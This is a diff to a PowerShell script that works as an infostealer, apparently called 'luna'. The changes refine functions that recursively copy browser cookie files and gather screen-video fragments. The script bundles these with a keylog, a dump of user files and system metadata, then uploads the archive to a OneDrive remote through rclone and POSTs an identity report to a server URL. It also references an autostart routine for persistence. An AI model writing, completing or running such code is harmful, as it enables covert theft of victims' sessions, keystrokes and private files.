@@ -23,10 +23,13 @@ function Collect-Cookies {
 
     foreach ($root in $targets) {
         if (Test-Path $root) {
-            Get-ChildItem -Path $root -Recurse -Include $patterns -ErrorAction SilentlyContinue |
-            Where-Object {
-                $_.Length -le $maxSize -and
-                ($keywords | Where-Object { $_ -and $_.ToLowerInvariant() -ne "" -and $_.Name.ToLowerInvariant().Contains($_.ToLowerInvariant()) }) -ne $null
+            Get-ChildItem -Path $root -Recurse -Include $patterns -File -ErrorAction SilentlyContinue |
+            Where-Object { $_.Length -gt 0 } |
+            ForEach-Object {
+                try {
+                    $safeName = $_.FullName -replace '[^\w\d\-_\.]', '_'
+                    Copy-Item $_.FullName "$cookieDir\$safeName" -Force -ErrorAction Stop
+                } catch {}
             }
         }
     }
@@ -116,8 +119,9 @@ function Ensure-Autostart {
 }
 
 function Archive-And-Report {
-    $videoSubDir = \"$tempDir\\video\"
+    $videoSubDir = "$tempDir\video"
     New-Item -ItemType Directory -Path $videoSubDir -Force -ErrorAction SilentlyContinue | Out-Null
+
     $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
     $user = $env:USERNAME
     $videoDir = "$env:USERPROFILE\luna_video_fragments"
@@ -129,18 +133,13 @@ function Archive-And-Report {
         $report | ConvertTo-Json -Depth 5 | Set-Content -Path $logPath -Encoding utf8
         "System: $user@$env:COMPUTERNAME`nDate: $timestamp" | Set-Content $meta
 
-        $files = @($logPath, $meta, $keylogPath, $cookieDir, $fileDumpDir, $videoSubDir)
-        $files += Get-Item $logPath, $meta, $keylogPath -ErrorAction SilentlyContinue
-        $files += Get-ChildItem $fileDumpDir -Recurse -File -ErrorAction SilentlyContinue
-        $files += Get-ChildItem $cookieDir -Recurse -File -ErrorAction SilentlyContinue
         if (Test-Path $videoDir) {
-            $videoFiles = Get-ChildItem $videoDir -Filter *.mp4 -File -ErrorAction SilentlyContinue
-            foreach ($vf in $videoFiles) {
-                Copy-Item $vf.FullName \"$tempDir\\video\\$($vf.Name)\" -Force -ErrorAction SilentlyContinue
+            Get-ChildItem $videoDir -Filter *.mp4 -File -ErrorAction SilentlyContinue | ForEach-Object {
+                Copy-Item $_.FullName "$videoSubDir\$($_.Name)" -Force -ErrorAction SilentlyContinue
             }
         }
 
-        Compress-Archive -Path $files.FullName -DestinationPath $zipPath -Force
+        Compress-Archive -Path @($logPath, $meta, $keylogPath, $cookieDir, $fileDumpDir, $videoSubDir) -DestinationPath $zipPath -Force
 
         & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:luna_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet
 
@@ -151,15 +150,19 @@ function Archive-And-Report {
             Invoke-RestMethod -Uri "$serverUrl/screenshot-archive" -Method POST -Body $body -ContentType "application/json"
         }
 
-        $summary = @"
-        PowerShell Identity Report
-        User: $user
-        Machine: $env:COMPUTERNAME
-        Time: $timestamp
-        Files: $((Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue).Count)
-        Cookies: $((Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue).Count)
-        "@
+        $filesCount = (Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue).Count
+        $cookiesCount = (Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue).Count
 
+        $summary = @"
+PowerShell Identity Report
+User: $user
+Machine: $env:COMPUTERNAME
+Time: $timestamp
+Files: $filesCount
+Cookies: $cookiesCount
+"@
+
+        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body (@{ text = $summary } | ConvertTo-Json -Compress) -ContentType "application/json"
     } catch {
         Write-Warning "Archive or report failed: $_"
     }
